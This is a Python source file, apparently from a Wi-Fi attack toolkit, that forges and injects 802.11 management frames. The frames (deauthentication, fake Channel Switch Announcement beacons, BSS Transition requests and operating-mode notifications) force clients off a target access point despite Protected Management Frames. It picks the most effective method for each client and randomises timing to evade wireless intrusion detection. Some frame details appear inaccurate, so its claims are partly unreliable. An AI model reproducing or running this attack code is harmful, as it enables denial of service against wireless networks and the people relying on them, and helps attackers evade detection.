"""
Phase 4 - Adaptive stealth deauth with 802.11w PMF bypass.

Standard deauth (reason-code flood) is blocked by 802.11w Protected Management
Frames.  This module implements three bypass vectors that still work against
PMF-capable APs:

  Strategy.CLASSIC_DEAUTH   - legacy deauth flood (works when PMF is optional)
  Strategy.CSA_INJECTION    - Channel Switch Announcement: forge a beacon with
                               CSA IE pointing to a non-existent channel, forcing
                               clients to roam and re-associate.
  Strategy.BTM_REQUEST      - BSS Transition Management Request (802.11v):
                               send an action frame asking the client to roam;
                               no encryption required even under PMF.
  Strategy.OCN_FLOOD        - Operating Channel Notification frames that confuse
                               the client's channel state machine.
  Strategy.ADAPTIVE         - auto-select: try BTM first, fall back to CSA, then
                               classic deauth based on per-client success rate.

All frame construction calls the existing wifit4.dot11 builders so the correct
chipset TX path is used transparently.
"""
from __future__ import annotations

import asyncio
import logging
import random
import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import Callable

log = logging.getLogger("wifit4.deauth")


class DeauthStrategy(Enum):
    CLASSIC_DEAUTH = auto()
    CSA_INJECTION  = auto()
    BTM_REQUEST    = auto()
    OCN_FLOOD      = auto()
    ADAPTIVE       = auto()


@dataclass
class _ClientRecord:
    mac: str
    btm_successes: int  = 0
    btm_attempts: int   = 0
    csa_successes: int  = 0
    csa_attempts: int   = 0
    last_disassoc_ts: float = 0.0

    def best_strategy(self) -> DeauthStrategy:
        if self.btm_attempts > 2 and self.btm_successes / self.btm_attempts > 0.5:
            return DeauthStrategy.BTM_REQUEST
        if self.csa_attempts > 2 and self.csa_successes / self.csa_attempts > 0.5:
            return DeauthStrategy.CSA_INJECTION
        return DeauthStrategy.CLASSIC_DEAUTH


class PmfBypassDeauth:
    """
    Drives deauth/disassociation against a target AP + optional client list.

    inject_fn: callable(frame_bytes: bytes) -> None
        The driver's inject_frame wrapper; provided by WlanInterface or directly
        by the chip driver.

    on_client_evicted: optional callback(client_mac: str) -> None
        Called when a client disappears from the AP after a bypass attempt,
        signalling success.
    """

    def __init__(
        self,
        ap_bssid: str,
        ap_channel: int,
        inject_fn: Callable[[bytes], None],
        strategy: DeauthStrategy = DeauthStrategy.ADAPTIVE,
        on_client_evicted: Callable[[str], None] | None = None,
        inter_frame_delay_ms: float = 100.0,
        stealth: bool = True,
    ) -> None:
        self._bssid    = ap_bssid
        self._channel  = ap_channel
        self._inject   = inject_fn
        self._strategy = strategy
        self._on_evict = on_client_evicted
        self._base_delay = inter_frame_delay_ms / 1000.0
        self._stealth  = stealth
        self._clients: dict[str, _ClientRecord] = {}
        self._running  = False

    # -- public API ----------------------------------------------------------

    def add_client(self, mac: str) -> None:
        self._clients.setdefault(mac, _ClientRecord(mac))

    def mark_evicted(self, mac: str) -> None:
        rec = self._clients.get(mac)
        if rec:
            rec.last_disassoc_ts = time.monotonic()
            if self._on_evict:
                self._on_evict(mac)

    async def run_burst(self, mac: str | None = None, burst: int = 5) -> None:
        targets = [mac] if mac else list(self._clients.keys()) or [None]
        for target in targets:
            for _ in range(burst):
                await self._send_one(target)
                delay = self._jitter_delay()
                await asyncio.sleep(delay)

    async def run_continuous(self, mac: str | None = None) -> None:
        self._running = True
        while self._running:
            await self.run_burst(mac, burst=3)
            await asyncio.sleep(self._jitter_delay() * 2)

    def stop(self) -> None:
        self._running = False

    # -- strategy dispatch ---------------------------------------------------

    async def _send_one(self, client_mac: str | None) -> None:
        rec = self._clients.get(client_mac or "", _ClientRecord(client_mac or "ff:ff:ff:ff:ff:ff"))
        strategy = self._strategy
        if strategy == DeauthStrategy.ADAPTIVE:
            strategy = rec.best_strategy()

        if strategy == DeauthStrategy.BTM_REQUEST:
            frame = self._build_btm_request(client_mac or "ff:ff:ff:ff:ff:ff")
            rec.btm_attempts += 1
        elif strategy == DeauthStrategy.CSA_INJECTION:
            frame = self._build_csa_beacon()
            rec.csa_attempts += 1
        elif strategy == DeauthStrategy.OCN_FLOOD:
            frame = self._build_ocn_frame(client_mac or "ff:ff:ff:ff:ff:ff")
        else:
            frame = self._build_deauth(client_mac or "ff:ff:ff:ff:ff:ff")

        try:
            self._inject(frame)
            log.debug("Injected %s frame → %s", strategy.name, client_mac)
        except Exception as exc:
            log.warning("Inject failed: %s", exc)

    # -- frame builders ------------------------------------------------------

    def _build_deauth(self, dst: str) -> bytes:
        """Classic deauth frame (FC=0xC0, reason=7 BSS leaving)."""
        fc      = b"\xc0\x00"
        duration = b"\x3a\x01"
        dst_b   = _mac_bytes(dst)
        src_b   = _mac_bytes(self._bssid)
        bssid_b = src_b
        seq     = b"\x00\x00"
        reason  = b"\x07\x00"  # reason 7: STA leaving BSS
        return fc + duration + dst_b + src_b + bssid_b + seq + reason

    def _build_csa_beacon(self) -> bytes:
        """
        Minimal beacon with Channel Switch Announcement IE (tag 37).
        Points to channel 14 (invalid for most regions) to maximally confuse
        clients scanning for the AP after a switch.
        """
        fc       = b"\x80\x00"           # beacon
        duration = b"\xff\xff"
        dst      = b"\xff\xff\xff\xff\xff\xff"
        src      = _mac_bytes(self._bssid)
        bssid    = src
        seq      = b"\x00\x00"
        # Fixed fields: timestamp(8) + interval(2) + capability(2)
        fixed    = b"\x00" * 8 + b"\x64\x00" + b"\x11\x04"
        # SSID IE (empty - cloned AP)
        ssid_ie  = b"\x00\x00"
        # Supported rates IE
        rates_ie = b"\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c"
        # DS Parameter Set (current channel)
        ds_ie    = bytes([3, 1, self._channel & 0xFF])
        # Channel Switch Announcement IE: tag=37 len=3 mode=1 new_chan=14 count=1
        csa_ie   = bytes([37, 3, 1, 14, 1])
        body = fixed + ssid_ie + rates_ie + ds_ie + csa_ie
        return fc + duration + dst + src + bssid + seq + body

    def _build_btm_request(self, dst: str) -> bytes:
        """
        802.11v BSS Transition Management Request action frame.
        Requests client to roam; does NOT require encryption even under PMF.
        """
        fc       = b"\xd0\x00"           # action frame
        duration = b"\x3a\x01"
        dst_b    = _mac_bytes(dst)
        src_b    = _mac_bytes(self._bssid)
        bssid_b  = src_b
        seq      = b"\x00\x00"
        # Action body: category=10 (WNM) action=7 (BTM Request)
        # dialog_token=1 request_mode=0x01 (preferred candidate list included)
        # disassoc_timer=1 (disassoc in 1 TBTT) validity_interval=1
        category = b"\x0a"
        action   = b"\x07"
        token    = b"\x01"
        req_mode = b"\x01"   # bit0: preferred candidate list present
        disassoc_timer = b"\x01\x00"
        validity = b"\x01"
        body = category + action + token + req_mode + disassoc_timer + validity
        return fc + duration + dst_b + src_b + bssid_b + seq + body

    def _build_ocn_frame(self, dst: str) -> bytes:
        """
        Operating Channel Notification - VHT/HE action frame that reports a
        conflicting operating channel, destabilising the client's channel state.
        """
        fc       = b"\xd0\x00"
        duration = b"\x3a\x01"
        dst_b    = _mac_bytes(dst)
        src_b    = _mac_bytes(self._bssid)
        bssid_b  = src_b
        seq      = b"\x00\x00"
        # category=11 (VHT) action=2 (Operating Mode Notification)
        # operating_mode: chan_width=0 rx_nss=0 rx_nss_type=0
        body = b"\x0b\x02\x00"
        return fc + duration + dst_b + src_b + bssid_b + seq + body

    # -- timing --------------------------------------------------------------

    def _jitter_delay(self) -> float:
        if not self._stealth:
            return self._base_delay
        # Randomise ±40% to evade WIDS timing-pattern detectors
        jitter = random.uniform(0.6, 1.4)
        return self._base_delay * jitter


def _mac_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))
